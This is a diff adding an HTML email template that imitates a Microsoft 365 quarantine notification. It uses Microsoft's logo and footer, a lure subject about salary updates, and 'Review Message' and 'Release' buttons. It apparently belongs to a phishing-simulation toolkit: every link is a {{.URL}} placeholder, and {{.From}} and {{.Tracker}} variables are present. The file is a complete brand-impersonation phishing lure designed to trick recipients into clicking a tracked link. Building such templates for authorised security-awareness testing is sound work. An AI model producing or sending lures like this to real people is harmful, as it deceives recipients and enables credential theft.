@@ -1,0 +1,870 @@
+<html>
+<head>
+	<title></title>
+</head>
+<body>
+<style type="text/css"><!--
+ /* Font Definitions */
+ @font-face
+	{font-family:"Cambria Math";
+	panose-1:2 4 5 3 5 4 6 3 2 4;
+	mso-font-charset:0;
+	mso-generic-font-family:roman;
+	mso-font-pitch:variable;
+	mso-font-signature:-536869121 1107305727 33554432 0 415 0;}
+@font-face
+	{font-family:Calibri;
+	panose-1:2 15 5 2 2 2 4 3 2 4;
+	mso-font-charset:0;
+	mso-generic-font-family:swiss;
+	mso-font-pitch:variable;
+	mso-font-signature:-469750017 -1040178053 9 0 511 0;}
+@font-face
+	{font-family:Aptos;
+	mso-font-charset:0;
+	mso-generic-font-family:swiss;
+	mso-font-pitch:variable;
+	mso-font-signature:536871559 3 0 0 415 0;}
+@font-face
+	{font-family:"Segoe UI";
+	panose-1:2 11 5 2 4 2 4 2 2 3;
+	mso-font-charset:0;
+	mso-generic-font-family:swiss;
+	mso-font-pitch:variable;
+	mso-font-signature:-469750017 -1073683329 9 0 511 0;}
+@font-face
+	{font-family:Consolas;
+	panose-1:2 11 6 9 2 2 4 3 2 4;
+	mso-font-charset:0;
+	mso-generic-font-family:modern;
+	mso-font-pitch:fixed;
+	mso-font-signature:-536869121 64767 1 0 415 0;}
+ /* Style Definitions */
+ p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{mso-style-unhide:no;
+	mso-style-qformat:yes;
+	mso-style-parent:"";
+	margin:0cm;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Aptos",sans-serif;
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;
+	mso-bidi-font-family:Aptos;}
+h1
+	{mso-style-priority:9;
+	mso-style-unhide:no;
+	mso-style-qformat:yes;
+	mso-style-link:"Heading 1 Char";
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	mso-outline-level:1;
+	font-size:24.0pt;
+	font-family:"Segoe UI",sans-serif;
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;
+	font-weight:bold;}
+h2
+	{mso-style-priority:9;
+	mso-style-unhide:no;
+	mso-style-qformat:yes;
+	mso-style-link:"Heading 2 Char";
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	mso-outline-level:2;
+	font-size:18.0pt;
+	font-family:"Segoe UI",sans-serif;
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;
+	font-weight:bold;}
+h3
+	{mso-style-priority:9;
+	mso-style-unhide:no;
+	mso-style-qformat:yes;
+	mso-style-link:"Heading 3 Char";
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	mso-outline-level:3;
+	font-size:13.5pt;
+	font-family:"Segoe UI",sans-serif;
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;
+	font-weight:bold;}
+h4
+	{mso-style-priority:9;
+	mso-style-unhide:no;
+	mso-style-qformat:yes;
+	mso-style-link:"Heading 4 Char";
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	mso-outline-level:4;
+	font-size:12.0pt;
+	font-family:"Segoe UI",sans-serif;
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;
+	font-weight:bold;}
+a:link, span.MsoHyperlink
+	{mso-style-priority:99;
+	font-family:"Segoe UI",sans-serif;
+	mso-ascii-font-family:"Segoe UI";
+	mso-hansi-font-family:"Segoe UI";
+	mso-bidi-font-family:"Segoe UI";
+	color:#0078D4;
+	mso-text-animation:none;
+	text-decoration:none;
+	text-underline:none;
+	text-decoration:none;
+	text-line-through:none;}
+a:visited, span.MsoHyperlinkFollowed
+	{mso-style-noshow:yes;
+	mso-style-priority:99;
+	font-family:"Segoe UI",sans-serif;
+	mso-ascii-font-family:"Segoe UI";
+	mso-hansi-font-family:"Segoe UI";
+	mso-bidi-font-family:"Segoe UI";
+	color:#0078D4;
+	mso-text-animation:none;
+	text-decoration:none;
+	text-underline:none;
+	text-decoration:none;
+	text-line-through:none;}
+em
+	{mso-style-priority:20;
+	mso-style-unhide:no;
+	mso-style-qformat:yes;
+	font-family:"Segoe UI",sans-serif;
+	mso-ascii-font-family:"Segoe UI";
+	mso-hansi-font-family:"Segoe UI";
+	mso-bidi-font-family:"Segoe UI";
+	color:#666666;
+	font-style:normal;}
+p
+	{mso-style-noshow:yes;
+	mso-style-priority:99;
+	margin:0cm;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Segoe UI",sans-serif;
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;}
+span.Heading1Char
+	{mso-style-name:"Heading 1 Char";
+	mso-style-priority:9;
+	mso-style-unhide:no;
+	mso-style-locked:yes;
+	mso-style-link:"Heading 1";
+	mso-ansi-font-size:20.0pt;
+	mso-bidi-font-size:20.0pt;
+	font-family:"Calibri Light",sans-serif;
+	mso-ascii-font-family:"Calibri Light";
+	mso-ascii-theme-font:major-latin;
+	mso-fareast-font-family:"Times New Roman";
+	mso-fareast-theme-font:major-fareast;
+	mso-hansi-font-family:"Calibri Light";
+	mso-hansi-theme-font:major-latin;
+	mso-bidi-font-family:"Times New Roman";
+	mso-bidi-theme-font:major-bidi;
+	color:#2F5496;
+	mso-themecolor:accent1;
+	mso-themeshade:191;}
+span.Heading2Char
+	{mso-style-name:"Heading 2 Char";
+	mso-style-noshow:yes;
+	mso-style-priority:9;
+	mso-style-unhide:no;
+	mso-style-locked:yes;
+	mso-style-link:"Heading 2";
+	mso-ansi-font-size:16.0pt;
+	mso-bidi-font-size:16.0pt;
+	font-family:"Calibri Light",sans-serif;
+	mso-ascii-font-family:"Calibri Light";
+	mso-ascii-theme-font:major-latin;
+	mso-fareast-font-family:"Times New Roman";
+	mso-fareast-theme-font:major-fareast;
+	mso-hansi-font-family:"Calibri Light";
+	mso-hansi-theme-font:major-latin;
+	mso-bidi-font-family:"Times New Roman";
+	mso-bidi-theme-font:major-bidi;
+	color:#2F5496;
+	mso-themecolor:accent1;
+	mso-themeshade:191;}
+span.Heading3Char
+	{mso-style-name:"Heading 3 Char";
+	mso-style-noshow:yes;
+	mso-style-priority:9;
+	mso-style-unhide:no;
+	mso-style-locked:yes;
+	mso-style-link:"Heading 3";
+	mso-ansi-font-size:14.0pt;
+	mso-bidi-font-size:14.0pt;
+	font-family:"Calibri",sans-serif;
+	mso-ascii-font-family:Calibri;
+	mso-ascii-theme-font:minor-latin;
+	mso-fareast-font-family:"Times New Roman";
+	mso-fareast-theme-font:major-fareast;
+	mso-hansi-font-family:Calibri;
+	mso-hansi-theme-font:minor-latin;
+	mso-bidi-font-family:"Times New Roman";
+	mso-bidi-theme-font:major-bidi;
+	color:#2F5496;
+	mso-themecolor:accent1;
+	mso-themeshade:191;}
+span.Heading4Char
+	{mso-style-name:"Heading 4 Char";
+	mso-style-noshow:yes;
+	mso-style-priority:9;
+	mso-style-unhide:no;
+	mso-style-locked:yes;
+	mso-style-link:"Heading 4";
+	mso-ansi-font-size:12.0pt;
+	mso-bidi-font-size:12.0pt;
+	font-family:"Calibri",sans-serif;
+	mso-ascii-font-family:Calibri;
+	mso-ascii-theme-font:minor-latin;
+	mso-fareast-font-family:"Times New Roman";
+	mso-fareast-theme-font:major-fareast;
+	mso-hansi-font-family:Calibri;
+	mso-hansi-theme-font:minor-latin;
+	mso-bidi-font-family:"Times New Roman";
+	mso-bidi-theme-font:major-bidi;
+	color:#2F5496;
+	mso-themecolor:accent1;
+	mso-themeshade:191;
+	font-style:italic;}
+p.msonormal0, li.msonormal0, div.msonormal0
+	{mso-style-name:msonormal;
+	mso-style-unhide:no;
+	margin:0cm;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Segoe UI",sans-serif;
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;}
+p.img-block, li.img-block, div.img-block
+	{mso-style-name:img-block;
+	mso-style-unhide:no;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	font-size:7.5pt;
+	font-family:"Segoe UI",sans-serif;
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;
+	color:#CCCCCC;}
+p.comment, li.comment, div.comment
+	{mso-style-name:comment;
+	mso-style-unhide:no;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	font-size:10.5pt;
+	font-family:"Segoe UI",sans-serif;
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;
+	color:#333333;}
+p.img-padding, li.img-padding, div.img-padding
+	{mso-style-name:img-padding;
+	mso-style-unhide:no;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Segoe UI",sans-serif;
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;}
+p.comment-gfx, li.comment-gfx, div.comment-gfx
+	{mso-style-name:comment-gfx;
+	mso-style-unhide:no;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Segoe UI",sans-serif;
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;}
+p.note, li.note, div.note
+	{mso-style-name:note;
+	mso-style-unhide:no;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	font-size:10.0pt;
+	font-family:"Segoe UI",sans-serif;
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;}
+p.active, li.active, div.active
+	{mso-style-name:active;
+	mso-style-unhide:no;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	background:#CEF1DE;
+	font-size:10.5pt;
+	font-family:"Segoe UI",sans-serif;
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;
+	color:#333333;}
+p.inactive, li.inactive, div.inactive
+	{mso-style-name:inactive;
+	mso-style-unhide:no;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	background:#EEEEEE;
+	font-size:10.5pt;
+	font-family:"Segoe UI",sans-serif;
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;
+	color:#666666;
+	text-decoration:line-through;}
+p.row-label, li.row-label, div.row-label
+	{mso-style-name:row-label;
+	mso-style-unhide:no;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	line-height:12.0pt;
+	mso-pagination:widow-orphan;
+	font-size:10.5pt;
+	font-family:"Segoe UI",sans-serif;
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;
+	color:#333333;}
+p.num, li.num, div.num
+	{mso-style-name:num;
+	mso-style-unhide:no;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	background:#F2F2F2;
+	font-size:10.5pt;
+	font-family:"Segoe UI",sans-serif;
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;}
+p.data, li.data, div.data
+	{mso-style-name:data;
+	mso-style-unhide:no;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	word-break:break-all;
+	font-size:12.0pt;
+	font-family:"Courier New";
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;}
+p.red, li.red, div.red
+	{mso-style-name:red;
+	mso-style-unhide:no;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Segoe UI",sans-serif;
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;
+	color:red;}
+p.anchors, li.anchors, div.anchors
+	{mso-style-name:anchors;
+	mso-style-unhide:no;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Segoe UI",sans-serif;
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;}
+p.author, li.author, div.author
+	{mso-style-name:author;
+	mso-style-unhide:no;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	font-size:10.0pt;
+	font-family:"Segoe UI",sans-serif;
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;
+	color:#666666;
+	font-style:italic;}
+p.code, li.code, div.code
+	{mso-style-name:code;
+	mso-style-unhide:no;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Segoe UI",sans-serif;
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;
+	color:#666666;}
+p.container, li.container, div.container
+	{mso-style-name:container;
+	mso-style-unhide:no;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Segoe UI",sans-serif;
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;}
+p.content, li.content, div.content
+	{mso-style-name:content;
+	mso-style-unhide:no;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Segoe UI",sans-serif;
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;}
+p.markdown-code, li.markdown-code, div.markdown-code
+	{mso-style-name:markdown-code;
+	mso-style-unhide:no;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	background:#EAEAEA;
+	font-size:12.0pt;
+	font-family:"Segoe UI",sans-serif;
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;}
+p.markdown-table, li.markdown-table, div.markdown-table
+	{mso-style-name:markdown-table;
+	mso-style-unhide:no;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	border:none;
+	mso-border-alt:solid #A6A6A6 .75pt;
+	padding:0cm;
+	mso-padding-alt:6.0pt 8.0pt 8.0pt 8.0pt;
+	font-size:12.0pt;
+	font-family:"Segoe UI",sans-serif;
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;}
+p.file-delete, li.file-delete, div.file-delete
+	{mso-style-name:file-delete;
+	mso-style-unhide:no;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Segoe UI",sans-serif;
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;
+	text-decoration:line-through;}
+p.message-line, li.message-line, div.message-line
+	{mso-style-name:message-line;
+	mso-style-unhide:no;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:3.75pt;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Segoe UI",sans-serif;
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;
+	color:#201F1E;}
+p.btn-primary, li.btn-primary, div.btn-primary
+	{mso-style-name:btn-primary;
+	mso-style-unhide:no;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Segoe UI",sans-serif;
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;}
+p.btn-default, li.btn-default, div.btn-default
+	{mso-style-name:btn-default;
+	mso-style-unhide:no;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:"Segoe UI",sans-serif;
+	mso-fareast-font-family:Calibri;
+	mso-fareast-theme-font:minor-latin;}
+span.monospaced
+	{mso-style-name:monospaced;
+	mso-style-unhide:no;
+	font-family:Consolas;
+	mso-ascii-font-family:Consolas;
+	mso-hansi-font-family:Consolas;
+	mso-bidi-font-family:"Segoe UI";}
+span.message-line1
+	{mso-style-name:message-line1;
+	mso-style-unhide:no;
+	mso-ansi-font-size:12.0pt;
+	mso-bidi-font-size:12.0pt;
+	font-family:"Segoe UI",sans-serif;
+	mso-ascii-font-family:"Segoe UI";
+	mso-hansi-font-family:"Segoe UI";
+	mso-bidi-font-family:"Segoe UI";
+	color:#201F1E;
+	font-weight:normal;}
+.MsoChpDefault
+	{mso-style-type:export-only;
+	mso-default-props:yes;
+	font-size:10.0pt;
+	mso-ansi-font-size:10.0pt;
+	mso-bidi-font-size:10.0pt;
+	mso-font-kerning:0pt;
+	mso-ligatures:none;}
+@page WordSection1
+	{size:612.0pt 792.0pt;
+	margin:72.0pt 72.0pt 72.0pt 72.0pt;
+	mso-header-margin:36.0pt;
+	mso-footer-margin:36.0pt;
+	mso-paper-source:0;}
+div.WordSection1
+	{page:WordSection1;}
+-->
+</style>
+<div>
+<table>
+	<tbody>
+		<tr>
+			<td>&nbsp;</td>
+			<td>
+			<table>
+				<tbody>
+					<tr>
+						<td>&nbsp;</td>
+					</tr>
+				</tbody>
+			</table>
+
+			<p><span style="font-size: 10.5pt; color: rgb(33, 33, 33);">&nbsp;</span></p>
+
+			<table>
+				<tbody>
+					<tr>
+						<td>
+						<table>
+							<tbody>
+								<tr>
+									<td>
+									<table>
+										<tbody>
+											<tr>
+												<td>
+												<table>
+													<tbody>
+														<tr>
+															<td>&nbsp;</td>
+														</tr>
+														<tr>
+															<td>
+															<table>
+																<tbody>
+																	<tr>
+																		<td>
+																		<table>
+																			<tbody>
+																				<tr>
+																					<td>&nbsp;</td>
+																				</tr>
+																			</tbody>
+																		</table>
+																		</td>
+																	</tr>
+																</tbody>
+															</table>
+															</td>
+														</tr>
+													</tbody>
+												</table>
+												</td>
+											</tr>
+										</tbody>
+									</table>
+									</td>
+								</tr>
+							</tbody>
+						</table>
+						</td>
+					</tr>
+				</tbody>
+			</table>
+			</td>
+			<td>&nbsp;</td>
+		</tr>
+		<tr>
+			<td>&nbsp;</td>
+			<td>
+			<table>
+				<tbody>
+					<tr>
+						<td>&nbsp;</td>
+					</tr>
+				</tbody>
+			</table>
+
+			<p><span style="font-size: 10.5pt; color: rgb(33, 33, 33);">&nbsp;</span></p>
+
+			<table>
+				<tbody>
+					<tr>
+						<td>
+						<table>
+							<tbody>
+								<tr>
+									<td>
+									<table>
+										<tbody>
+											<tr>
+												<td>
+												<table>
+													<tbody>
+														<tr>
+															<td>
+															<p><span style="font-size: 10.5pt; color: rgb(33, 33, 33);"><a href="{{.URL}}" rel="noopener" target="_self"><span><img alt="Microsoft" height="77" src="https://blogs.microsoft.com/wp-content/uploads/prod/2012/08/8867.Microsoft_5F00_Logo_2D00_for_2D00_screen.jpg" width="200" /></span></a></span></p>
+															</td>
+														</tr>
+														<tr>
+															<td>
+															<table>
+																<tbody>
+																	<tr>
+																		<td>
+																		<p><b><span style="font-size: 21pt; color: rgb(33, 33, 33);">Review These Messages</span></b></p>
+																		</td>
+																	</tr>
+																</tbody>
+															</table>
+															</td>
+														</tr>
+														<tr>
+															<td>
+															<table>
+																<tbody>
+																	<tr>
+																		<td>
+																		<p><span><b><span>1 messages</span></b></span><span><span> are being held for you to review as of </span></span><span><b><span>21/01/2025 1:21:00 PM (UTC)</span></b></span><span><span>. </span></span></p>
+																		</td>
+																	</tr>
+																	<tr>
+																		<td>
+																		<p><span><span>Review them within </span></span><span><b><span>30 days of the received date</span></b></span><span><span> by going to the <a href="{{.URL}}" rel="noopener" target="_self">Quarantine page</a> in the Security Center. </span></span></p>
+																		</td>
+																	</tr>
+																</tbody>
+															</table>
+															</td>
+														</tr>
+													</tbody>
+												</table>
+												</td>
+											</tr>
+										</tbody>
+									</table>
+									</td>
+								</tr>
+							</tbody>
+						</table>
+						</td>
+					</tr>
+					<tr>
+						<td>
+						<table>
+							<tbody>
+								<tr>
+									<td>
+									<table>
+										<tbody>
+											<tr>
+												<td>
+												<table>
+													<tbody>
+														<tr>
+															<td>
+															<p><b><span style="font-size: 16pt; color: rgb(33, 33, 33);">Prevented spam messages </span></b></p>
+															</td>
+														</tr>
+														<tr>
+															<td>
+															<table>
+																<tbody>
+																	<tr style="height: 15.75pt;">
+																		<td>
+																		<p><span style="color: black;">Sender: </span></p>
+																		</td>
+																		<td>
+																		<p><span style="color: rgb(72, 70, 68);"><a href="{{.URL}}" rel="noopener" target="_self">{{.From}}</a> </span></p>
+																		</td>
+																		<td>
+																		<p><span style="font-size: 10.5pt; color: rgb(33, 33, 33);">&nbsp;</span></p>
+																		</td>
+																		<td>
+																		<p><span style="font-size: 10.5pt; color: rgb(102, 102, 102);">&nbsp;</span></p>
+																		</td>
+																	</tr>
+																	<tr style="height: 15.75pt;">
+																		<td>
+																		<p><span style="color: black;">Subject: </span></p>
+																		</td>
+																		<td>
+																		<p><span style="color: rgb(72, 70, 68);">Excel - Salary Updates for the Upcoming Month </span></p>
+																		</td>
+																		<td>
+																		<p><span style="font-size: 10.5pt; color: rgb(33, 33, 33);">&nbsp;</span></p>
+																		</td>
+																		<td>
+																		<p><span style="font-size: 10.5pt; color: rgb(102, 102, 102);">&nbsp;</span></p>
+																		</td>
+																	</tr>
+																	<tr style="height: 15.75pt;">
+																		<td>
+																		<p><span style="color: black;">Date: </span></p>
+																		</td>
+																		<td>
+																		<p><span style="color: rgb(72, 70, 68);">21/01/2025&nbsp;9:30:38&nbsp;AM </span></p>
+																		</td>
+																		<td>
+																		<p><span style="font-size: 10.5pt; color: rgb(33, 33, 33);">&nbsp;</span></p>
+																		</td>
+																		<td>
+																		<p><span style="font-size: 10.5pt; color: rgb(102, 102, 102);">&nbsp;</span></p>
+																		</td>
+																	</tr>
+																	<tr>
+																		<td>
+																		<table>
+																			<tbody>
+																				<tr>
+																					<td>
+																					<p><span style="font-size: 10.5pt; color: rgb(33, 33, 33);"><a href="{{.URL}}}" rel="noopener" target="_self"><span style="color: white;">Review Message </span></a></span></p>
+																					</td>
+																					<td>&nbsp;</td>
+																					<td>
+																					<p><span style="font-size: 10.5pt; color: rgb(33, 33, 33);"><a href="{{.URL}}" rel="noopener" target="_self"><span style="color: rgb(33, 33, 33);">Release </span></a></span></p>
+																					</td>
+																					<td>&nbsp;</td>
+																				</tr>
+																			</tbody>
+																		</table>
+																		</td>
+																		<td>&nbsp;</td>
+																		<td>&nbsp;</td>
+																	</tr>
+																	<tr>
+																		<td>
+																		<p><span style="font-size: 10.5pt; color: rgb(33, 33, 33);">&nbsp;</span></p>
+																		</td>
+																		<td>
+																		<p><span style="font-size: 10.5pt; color: rgb(102, 102, 102);">&nbsp;</span></p>
+																		</td>
+																		<td>
+																		<p><span style="font-size: 10.5pt; color: rgb(33, 33, 33);">&nbsp;</span></p>
+																		</td>
+																		<td>
+																		<p><span style="font-size: 10.5pt; color: rgb(102, 102, 102);">&nbsp;</span></p>
+																		</td>
+																	</tr>
+																</tbody>
+															</table>
+															</td>
+														</tr>
+													</tbody>
+												</table>
+												</td>
+											</tr>
+										</tbody>
+									</table>
+									</td>
+								</tr>
+							</tbody>
+						</table>
+						</td>
+					</tr>
+					<tr>
+						<td>
+						<table>
+							<tbody>
+								<tr>
+									<td>
+									<p><span style="font-size: 9pt; color: rgb(102, 102, 102);">&copy; 2025 Microsoft Corporation. All rights reserved. </span></p>
+									</td>
+								</tr>
+								<tr>
+									<td>
+									<p><span style="font-size: 9pt; color: rgb(102, 102, 102);"><a href="{{.URL}}" rel="noopener" target="_self">Privacy Statement</a> </span></p>
+									</td>
+								</tr>
+								<tr>
+									<td>
+									<p><span style="font-size: 9pt; color: rgb(102, 102, 102);"><a href="{{.URL}}" rel="noopener" target="_self">Acceptable Use Policy</a> </span></p>
+									</td>
+								</tr>
+							</tbody>
+						</table>
+						</td>
+					</tr>
+				</tbody>
+			</table>
+			</td>
+			<td>&nbsp;</td>
+		</tr>
+	</tbody>
+</table>
+</div>
+
+<div style="font-size: 11pt; color: rgb(0, 0, 0);">&nbsp;</div>
+
+<p>{{.Tracker}}</p>
+</body>
+</html>
